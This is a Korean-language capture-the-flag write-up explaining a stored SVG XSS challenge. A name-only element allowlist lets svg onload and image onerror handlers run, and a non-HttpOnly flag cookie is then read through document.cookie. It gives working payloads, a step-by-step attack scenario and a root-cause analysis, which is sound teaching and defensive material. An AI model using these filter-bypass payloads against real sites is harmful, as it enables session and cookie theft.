# 1. Intro — 문제 개요

이 문제는 사용자가 업로드한 SVG 파일을 서버에 저장한 뒤, 플래그 쿠키를 가진 Selenium 봇이 해당 SVG를 확인하는 웹 문제이다.

애플리케이션은 업로드된 SVG를 단순 이미지로 출력하지 않는다. 클라이언트에서 파일 내용을 가져온 뒤 `DOMParser`로 파싱하고, 생성된 SVG 요소를 현재 페이지의 DOM에 직접 삽입한다.

서버는 SVG 내부에 포함될 수 있는 위험한 요소를 차단하기 위해 허용된 SVG 요소 목록을 검사한다. 하지만 요소의 이름만 검사하고 `onload`, `onerror` 등의 이벤트 속성은 검사하지 않는다.

따라서 허용된 SVG 요소에 이벤트 핸들러를 삽입하면 JavaScript를 실행할 수 있다.

이 취약점을 이용하면 Selenium 봇의 브라우저에서 `document.cookie`에 접근할 수 있으며, 최종적으로 플래그 쿠키를 확인할 수 있다.

전체 흐름은 다음과 같다.

```text
공격자
  │
  │ 악성 SVG 업로드
  ▼
Flask /upload
  │
  │ UUID가 포함된 이름으로 파일 저장
  ▼
uploads/<UUID>_<filename>
  │
  │ read_file() 호출
  ▼
Selenium Bot
  │
  │ 127.0.0.1에 flag 쿠키 설정
  │
  │ 업로드된 SVG가 지정된 페이지 접속
  ▼
PyScript / JavaScript
  │
  │ SVG 파일 fetch
  │
  │ DOMParser로 SVG 파싱
  │
  │ SVG 요소 이름 검사
  │
  │ 현재 페이지 DOM에 삽입
  ▼
SVG 이벤트 핸들러 실행
  │
  ▼
document.cookie 접근
```

# 2. Code — 코드 분석

## 2.2 업로드 디렉터리 설정

```python
app = Flask(__name__)

UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
```

업로드된 파일은 `uploads` 디렉터리에 저장된다.

`exist_ok=True`이므로 디렉터리가 이미 존재하는 경우에도 예외가 발생하지 않는다.

## 2.3 플래그 읽기

```python
try:
    FLAG = open("./flag", "r").read()
except:
    FLAG = "[**FLAG**]"
```

서버가 시작될 때 현재 디렉터리의 `flag` 파일을 읽는다.

파일을 읽지 못하면 기본 문자열을 사용한다.

이 값은 이후 Selenium 봇의 `flag` 쿠키로 설정된다.

## 2.4 메인 페이지

```python
@app.route('/')
def index():
    file = request.args.get('file', 'uploads/default.svg')
    return render_template('index.html', file=file)
```

`file` 쿼리 파라미터로 출력할 SVG 파일을 선택한다.

파라미터가 없는 경우 기본값은 다음과 같다.

```text
uploads/default.svg
```

예를 들어 다음 요청은 특정 업로드 파일을 대상으로 페이지를 렌더링한다.

```text
/?file=uploads/example.svg
```

## 2.5 업로드 파일 제공

```python
@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(
        app.config['UPLOAD_FOLDER'],
        filename
    )
```

`uploads` 디렉터리에 저장된 파일을 클라이언트에 전달한다.

`send_from_directory()`는 지정한 디렉터리를 기준으로 파일을 제공하므로 일반적인 `../` 기반 경로 순회 공격은 제한된다.

## 2.6 파일 업로드 처리

```python
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return redirect(request.url)

    file = request.files['file']

    if file.filename == '':
        return redirect(request.url)

    if file:
        filename = secure_filename(file.filename)
        unique_id = uuid.uuid4().hex
        unique_filename = f"{unique_id}_{filename}"

        file_path = os.path.join(
            app.config['UPLOAD_FOLDER'],
            unique_filename
        )

        file.save(file_path)
        read_file(unique_filename)

        return redirect(
            url_for(
                'index',
                file=f'uploads/{unique_filename}'
            )
        )

    return '', 204
```

파일 업로드 과정은 다음과 같다.

```text
1. multipart 요청에 file 필드가 있는지 검사
2. 원본 파일명이 비어 있는지 검사
3. secure_filename()으로 파일명 정규화
4. UUID 생성
5. UUID와 원본 파일명을 결합
6. uploads 디렉터리에 저장
7. read_file()로 Selenium 봇 실행
8. 저장된 파일을 표시하는 페이지로 리다이렉트
```

### `secure_filename()`

```python
filename = secure_filename(file.filename)
```

위험한 경로 구분자나 특수 문자를 안전한 파일명으로 정규화한다.

예를 들어 다음과 같은 파일명을 그대로 사용할 수 없게 한다.

```text
../../flag
../../../app.py
..\..\flag
```

### UUID 파일명

```python
unique_id = uuid.uuid4().hex
unique_filename = f"{unique_id}_{filename}"
```

파일명 앞에 무작위 UUID가 추가된다.

```text
test.svg
→ 01f08a..._test.svg
```

따라서 기존 업로드 파일이나 애플리케이션 파일을 같은 이름으로 덮어쓰기 어렵다.

### 검증되지 않는 항목

다음 항목은 검증하지 않는다.

```text
파일 확장자
Content-Type
실제 파일 형식
파일 크기
SVG 내부 속성
외부 리소스 URL
```

따라서 공격자는 임의의 내용을 가진 파일을 업로드할 수 있다.

## 2.7 Selenium 봇

```python
def read_file(filename):
    driver = None

    cookie = {
        "name": "flag",
        "value": FLAG
    }

    cookie.update({
        "domain": "127.0.0.1"
    })
```

Selenium 봇에 설정할 쿠키를 생성한다.

```text
쿠키 이름: flag
쿠키 값: FLAG 파일 내용
쿠키 도메인: 127.0.0.1
```

이 쿠키에는 `HttpOnly` 속성이 설정되지 않는다.

따라서 동일 출처에서 실행되는 JavaScript는 다음 코드로 쿠키에 접근할 수 있다.

```javascript
document.cookie
```

브라우저 설정은 다음과 같다.

```python
service = Service(
    executable_path="/usr/local/bin/chromedriver"
)

options = webdriver.ChromeOptions()

for arg in [
    "headless",
    "window-size=1920x1080",
    "disable-gpu",
    "no-sandbox",
    "disable-dev-shm-usage",
]:
    options.add_argument(arg)
```

Selenium은 먼저 메인 페이지에 접속한다.

```python
driver.get("http://127.0.0.1:8000/")
```

그다음 플래그 쿠키를 추가한다.

```python
driver.add_cookie(cookie)
```

이후 업로드된 SVG를 표시하는 페이지로 이동한다.

```python
driver.get(
    f"http://127.0.0.1:8000/"
    f"?file=uploads/{filename}"
)
```

마지막으로 페이지에 SVG 요소가 생성될 때까지 기다린다.

```python
WebDriverWait(driver, 10).until(
    EC.presence_of_element_located(
        (By.TAG_NAME, "svg")
    )
)
```

## 2.8 SVG 파일 불러오기

클라이언트는 지정된 SVG 파일을 `fetch()`로 읽는다.

```javascript
fetch(file)
```

응답을 문자열로 가져온 뒤 `DOMParser`를 사용해 SVG 문서로 파싱한다.

```python
def load_svg_from_string(svg_string):
    parser = DOMParser.new()

    doc = parser.parseFromString(
        svg_string,
        "image/svg+xml"
    )

    return doc.documentElement
```

`image/svg+xml`로 파싱하므로 결과는 SVG XML 문서이다.

중요한 점은 `DOMParser` 자체가 쿠키를 읽는 것이 아니라는 점이다.

```text
DOMParser
  ↓
문자열을 XMLDocument로 변환
  ↓
SVG 요소 생성
  ↓
현재 페이지 DOM에 삽입
  ↓
이벤트 핸들러 실행
  ↓
JavaScript가 document.cookie 접근
```

## 2.9 SVG 요소 허용 목록

애플리케이션은 SVG 내부 요소를 허용 목록과 비교한다.

```python
allowed_elements = [
    "svg",
    "path",
    "rect",
    "circle",
    "ellipse",
    "line",
    "polyline",
    "polygon",
    "text",
    "g",
    "defs",
    "linearGradient",
    "radialGradient",
    "stop",
    "clipPath",
    "mask",
    "pattern",
    "use",
    "image",
    "switch",
    "style",
]
```

모든 요소를 순회하면서 목록에 없는 요소를 거부한다.

```python
elements = doc.getElementsByTagName("*")

for element in elements:
    if element.tagName not in allowed_elements:
        raise ValueError(
            f"Disallowed SVG element found: "
            f"{element.tagName}"
        )
```

따라서 다음 SVG는 통과하지 못한다.

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    <![CDATA[
      alert(document.cookie);
    ]]>
  </script>
</svg>
```

`script`가 허용 목록에 없기 때문이다.

```text
Disallowed SVG element found: script
```

## 2.10 SVG DOM 삽입

검사를 통과한 SVG는 페이지의 DOM에 직접 삽입된다.

```python
svg_container.innerHTML = ""
svg_container.appendChild(svg_element)
```

이는 다음 방식과 다르다.

```html
<img src="/uploads/test.svg">
```

`img` 요소로 불러온 SVG는 일반적으로 이미지 컨텍스트로 처리된다.

반면 이 애플리케이션은 다음과 같이 SVG 요소 자체를 문서에 삽입한다.

```html
<div id="svg-container">
  <svg>
    ...
  </svg>
</div>
```

따라서 SVG에 남아 있는 이벤트 속성이 활성 JavaScript 실행 컨텍스트를 얻을 수 있다.

# 3. Vuln — 취약점

## 3.1 취약점 개요

핵심 취약점은 SVG 허용 목록이 **요소 이름만 검사하고 속성을 검사하지 않는 것**이다.

```python
if element.tagName not in allowed_elements:
    raise ValueError(...)
```

이 검사는 다음 항목을 확인하지 않는다.

```text
onload
onerror
onclick
onmouseover
onbegin
href
xlink:href
style
외부 리소스 주소
```

따라서 허용된 요소에 이벤트 핸들러를 추가할 수 있다.

---

## 3.2 `<script>` 요소는 차단됨

다음 형태는 실행되지 않는다.

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    alert(document.cookie);
  </script>
</svg>
```

이유는 `script` 요소가 허용 목록에 없기 때문이다.

즉, 이 문제의 핵심은 `<script>` 태그를 직접 삽입하는 방식이 아니다.

---

## 3.3 허용된 요소의 이벤트 속성

최상위 `svg` 요소는 허용 목록에 포함되어 있다.

```text
svg → 허용
```

하지만 `onload` 속성은 검사하지 않는다.

```xml
<svg
  xmlns="http://www.w3.org/2000/svg"
  onload="alert(document.cookie)">
</svg>
```

요소 검사 결과는 다음과 같다.

```text
요소 이름: svg
허용 여부: 허용
속성 검사: 수행하지 않음
```

따라서 `onload` 속성이 제거되지 않은 채 DOM에 삽입될 수 있다.

허용된 `image` 요소의 `onerror` 이벤트도 같은 원리로 사용할 수 있다.

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image
    href="/not-found"
    onerror="alert(document.cookie)"
  />
</svg>
```

---

## 3.4 Stored XSS

공격자가 업로드한 SVG는 서버의 `uploads` 디렉터리에 저장된다.

```text
사용자 입력
→ 서버 저장
→ 관리자 봇이 저장된 파일 열람
→ JavaScript 실행
```

따라서 이 취약점은 저장형 XSS의 특성을 가진다.

보다 구체적으로는 다음과 같이 분류할 수 있다.

```text
Stored XSS
SVG XSS
불완전한 Allowlist Sanitization
위험한 DOM 삽입
관리자 봇 쿠키 노출
```

---

## 3.5 쿠키 보안 속성 부재

Selenium 봇의 플래그 쿠키에는 `HttpOnly`가 설정되지 않았다.

```python
cookie = {
    "name": "flag",
    "value": FLAG,
    "domain": "127.0.0.1"
}
```

따라서 동일 출처 JavaScript에서 다음 코드가 동작한다.

```javascript
document.cookie
```

`HttpOnly`가 설정되어 있었다면 JavaScript에서 해당 쿠키를 읽을 수 없었을 것이다.

---

## 3.6 동일 출처 실행

Selenium은 다음 주소에서 페이지를 연다.

```text
http://127.0.0.1:8000/
```

플래그 쿠키도 `127.0.0.1` 도메인에 설정된다.

SVG는 해당 메인 페이지의 DOM에 직접 삽입된다.

따라서 SVG 이벤트 핸들러는 동일 출처인 다음 환경에서 실행된다.

```text
Scheme: http
Host: 127.0.0.1
Port: 8000
```

이로 인해 `document.cookie`로 플래그 쿠키에 접근할 수 있다.

---

## 3.7 외부 요청과 쿠키

외부 서버로 요청을 보낸다고 해서 `127.0.0.1`의 쿠키가 외부 도메인으로 자동 전송되지는 않는다.

```javascript
location.href = "https://example.com";
```

위 요청에는 `127.0.0.1` 쿠키가 포함되지 않는다.

브라우저는 쿠키를 도메인별로 분리하기 때문이다.

쿠키 값을 전달하려면 동일 출처에서 먼저 `document.cookie`로 값을 읽어야 한다.

```text
잘못된 방식
외부 서버로 단순 GET 요청
→ 127.0.0.1 쿠키가 자동 전송되지 않음

가능한 방식
document.cookie로 값 읽기
→ URL 파라미터 등에 값을 포함
→ 외부 요청 전송
```

---

## 3.8 프런트엔드 파일명 처리 오류

서버는 업로드 파일명에 UUID를 추가한다.

```python
unique_filename = f"{unique_id}_{filename}"
```

하지만 프런트엔드는 업로드 이후 원본 파일명으로 이동한다.

```javascript
const filename =
    document.getElementById('file-input')
        .files[0].name;

window.location.href =
    `/?file=uploads/${filename}`;
```

예를 들어 서버에 저장된 실제 이름이 다음과 같아도,

```text
9a28..._test.svg
```

브라우저는 다음 경로로 이동한다.

```text
uploads/test.svg
```

따라서 일반 사용자 화면에서는 업로드한 SVG가 정상적으로 표시되지 않을 수 있다.

그러나 서버는 실제 UUID 파일명을 `read_file()`에 전달한다.

```python
read_file(unique_filename)
```

따라서 Selenium 봇에서는 정상적으로 업로드 파일을 열며, 취약점 실행에 영향을 주지 않는다.

# 4. Payload — 공격 시나리오

## 4.1 검증용 SVG

`script` 요소는 차단되므로 허용된 `svg` 요소의 `onload` 속성을 사용한다.

```xml
<svg
  xmlns="http://www.w3.org/2000/svg"
  onload="alert(document.cookie)">
</svg>
```

이 SVG에는 다음 요소만 존재한다.

```text
svg
```

`svg`는 허용 목록에 포함되므로 요소 검사에 통과한다.

`onload` 속성은 검사되지 않으므로 그대로 유지된다.

---

## 4.2 공격 시나리오

### 1단계: SVG 파일 작성

공격자는 이벤트 속성이 포함된 SVG 파일을 작성한다.

```xml
<svg
  xmlns="http://www.w3.org/2000/svg"
  onload="alert(document.cookie)">
</svg>
```

### 2단계: 파일 업로드

작성한 SVG를 `/upload` 엔드포인트에 업로드한다.

```text
POST /upload
Content-Type: multipart/form-data
```

### 3단계: 파일 저장

서버는 파일명에 UUID를 추가하여 저장한다.

```text
test.svg
→ <UUID>_test.svg
```

저장 위치는 다음과 같다.

```text
uploads/<UUID>_test.svg
```

### 4단계: Selenium 봇 실행

업로드가 완료되면 서버가 다음 함수를 호출한다.

```python
read_file(unique_filename)
```

### 5단계: 플래그 쿠키 설정

Selenium 봇은 메인 페이지에 접속하고 플래그 쿠키를 설정한다.

```text
flag=<FLAG>
Domain=127.0.0.1
```

### 6단계: 업로드 SVG 페이지 접속

봇은 다음 형태의 주소로 이동한다.

```text
http://127.0.0.1:8000/
?file=uploads/<UUID>_test.svg
```

### 7단계: SVG 파싱

클라이언트는 SVG 파일을 가져온다.

```text
fetch
→ SVG 문자열
→ DOMParser
→ XMLDocument
```

### 8단계: 허용 목록 검사

SVG 내부 요소를 검사한다.

```text
svg → 허용
```

`onload` 속성은 검사하지 않는다.

### 9단계: DOM 삽입

검사를 통과한 SVG 요소를 현재 페이지에 삽입한다.

```python
svg_container.appendChild(svg_element)
```

### 10단계: 이벤트 실행

SVG의 `onload` 이벤트가 실행된다.

```javascript
alert(document.cookie)
```

동일 출처에서 실행되므로 Selenium 봇의 플래그 쿠키에 접근할 수 있다.

## 4.4 취약점의 근본 원인

취약점은 하나의 코드만으로 발생하지 않고 다음 조건이 결합되어 발생한다.

### 원인 1: SVG 업로드 허용

```python
file.save(file_path)
```

확장자와 콘텐츠 검증 없이 파일이 저장된다.

### 원인 2: 불완전한 필터

```python
if element.tagName not in allowed_elements:
    raise ValueError(...)
```

요소 이름만 검사하고 속성을 검사하지 않는다.

### 원인 3: 활성 DOM 삽입

```python
svg_container.appendChild(svg_element)
```

SVG를 단순 이미지가 아니라 실제 DOM 요소로 삽입한다.

### 원인 4: 쿠키의 `HttpOnly` 부재

```python
cookie = {
    "name": "flag",
    "value": FLAG,
    "domain": "127.0.0.1"
}
```

JavaScript가 쿠키를 읽을 수 있다.

# 결론

이 문제의 핵심은 `<script>` 요소를 직접 삽입하는 것이 아니다.

`script` 요소는 SVG 허용 목록 검사에서 차단된다. 하지만 허용된 `svg`, `image` 등의 요소에 포함된 이벤트 속성은 검사하지 않는다.

```xml
<svg
  xmlns="http://www.w3.org/2000/svg"
  onload="alert(document.cookie)">
</svg>
```

검사를 통과한 SVG는 현재 HTML 문서의 활성 DOM에 직접 삽입된다. 이 과정에서 이벤트 핸들러가 동일 출처 JavaScript로 실행되며, `HttpOnly`가 설정되지 않은 플래그 쿠키를 `document.cookie`로 읽을 수 있다.

따라서 이 문제는 다음과 같이 요약할 수 있다.

> 허용된 SVG 요소의 이벤트 속성을 이용하여 불완전한 요소 기반 필터를 우회하고, Selenium 봇의 플래그 쿠키에 접근하는 Stored SVG XSS 문제이다.
